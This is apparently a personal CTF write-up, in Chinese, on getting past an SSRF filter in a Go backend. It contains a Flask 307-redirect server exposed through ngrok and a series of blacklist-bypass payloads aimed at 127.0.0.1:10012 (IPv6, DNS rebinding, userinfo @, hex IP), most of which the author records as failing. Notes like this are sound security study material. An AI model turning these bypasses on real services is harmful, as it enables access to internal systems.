# 一、探测
`https://webhook.site/#!/view/319d6ef8-8e4e-4522-96d4-911c75258e81/a91f3f0f-541f-4bdc-ad21-6ebec8632021/1`
获得个人服务器url填入
`https://webhook.site/319d6ef8-8e4e-4522-96d4-911c75258e81`
JSON Data为：`{"test": "hello"}`

结果：
```
{
  "message": "forwarded",
  "target_status": 200,
  "target_body": "This URL has no default content configured. <a href=\"https://webhook.site/#!/edit/319d6ef8-8e4e-4522-96d4-911c75258e81\">Change response in Webhook.site</a>."
}
```

再点开`webhook`，收到POST方式发送的信息，`user-agent`为`Go-http-client/1.1`

两个思路

# 二、思路一：302 跳转绕过 (Redirect Bypass)
## 2.1 原理
后端服务器在收到你的 URL 时会先做一个检查（比如检查是不是 127.0.0.1）。如果检查通过，它才会去请求。但如果你的 URL 指向一个你控制的服务器，而你的服务器返回一个 302 跳转，让它去访问 127.0.0.1:10012，后端往往会直接跟随跳转，从而绕过初始检查。

## 2.2 实操：利用webhook（丢弃，要充钱）
### 2.2.1 修改webhook响应逻辑
Status Code (状态码): 改为 302。
Response Body: 留空。
添加 Header: 寻找 "Headers" 设置区域，添加一行：
  - Key: Location
  - Value: http://127.0.0.1:10012 (先尝试探测 10012 端口)
### 2.2.2 触发攻击
回到题目页面，依旧填入URL，data保持
custom actions中找到modify response，response headers中填入`Location: http://127.0.0.1:10012`，状态码为`302`，勾选`Send response and stop action execution`确保webhook直接发送302跳转，而不去执行默认的页面响应

## 2.3 实操：kali linux
编写`ssrf_redir.py`
```PYTHON
from flask import Flask, redirect, request

app = Flask(__name__)

@app.route('/redir', methods=['GET', 'POST'])
def redir():
    # 这里的 10012 是你想让服务器去访问的内网端口
    target = "http://127.0.0.1:10012/" 

    # 关键点：
    # 302 会把 POST 请求变成 GET。
    # 307 会保持请求方法不变（如果是 POST 还会继续 POST 过去）。
    return redirect(target, code=307) 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
### 2.3.1 利用localtunnel（失败）
运行服务器`python3 ssrf_redir.py`

使用localtunnel将本地服务映射到公网（内网穿透）：`npx localtunnel --port 5000`（命令error）

`npx localtunnel --port 5000 --subdomain hhh`

将localtunnel给的地址填入target url

### 2.3.2 利用ngrok
安装ngrok：
```
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
```

进入官网，注册账户：https://dashboard.ngrok.com/signup

获取密钥：（保存在我的）bitwarden中

绑定token
`ngrok config add-authtoken 认证令牌`

使用：`ngrok http 5000`

获得公网地址：`https://unpitying-chelsey-nucleolated.ngrok-free.dev`，由于python代码用到了`/redir`，因此完整的url为：`https://unpitying-chelsey-nucleolated.ngrok-free.dev/redir`

发送wenhook后获得信息：
```
{
  "message": "forwarded",
  "target_status": 307,
  "target_body": "<!doctype html>\n<html lang=en>\n<title>Redirecting...</title>\n<h1>Redirecting...</h1>\n<p>You should be redirected automatically to the target URL: <a href=\"http://127.0.0.1:10012/\">http://127.0.0.1:10012/</a>. If not, click the link.\n"
}
```
说明302/307跳转被后端禁用，那么转变思路，旨在在target url绕过黑名单


# 思路二：通过一句话注入payload
## 2.1 target url绕过黑名单
利用Go语言的`net/url`库在解析特殊格式的url时，可能让检查者和发起请求者产生不同的理解
经过不同的注入如：`http://[::]:10012/`

{
  "message": "blocked IP: ::"
}

{
  "message": "blocked IP: 127.0.0.1"
}

{
  "message": "resolve failed: lookup 0: no such host"
}

`http://7f000001.c0a80001.rbndr.us:10012/`结果有变化：（尽管依旧blocked）
{
  "message": "blocked IP: 192.168.0.1"
}

转换思路

## 2.2 利用user-info字段欺骗解析器

注入：`http://127.0.0.1:10012@google.com/`
结果：
```
{
  "message": "forward request failed: Post \"http://127.0.0.1:***@google.com/\": context deadline exceeded (Client.Timeout exceeded while awaiting headers)"
}
```

没有报blocked ip，说明后端检验骗过去了，它认为我访问的是google.com
但go语言把`@`后面的`google.com`当成了hoxg，把`127.0.0.1:10012`当成了用户名，因此应该反过来
注入：`http://google.com@127.0.0.1:10012/`
依旧失败

## 2.3 go 的空白字符解析漏洞（失败）

## 2.4 IDN (国际化域名) 绕过（失败）

## 2.5 利用fragment产生的解析歧义（失败）

## 2.6 其他
十六进制：`http://0x7f000001:10012/`
{
  "message": "resolve failed: lookup 0x7f000001 on 127.0.0.11:53: server misbehaving"
}

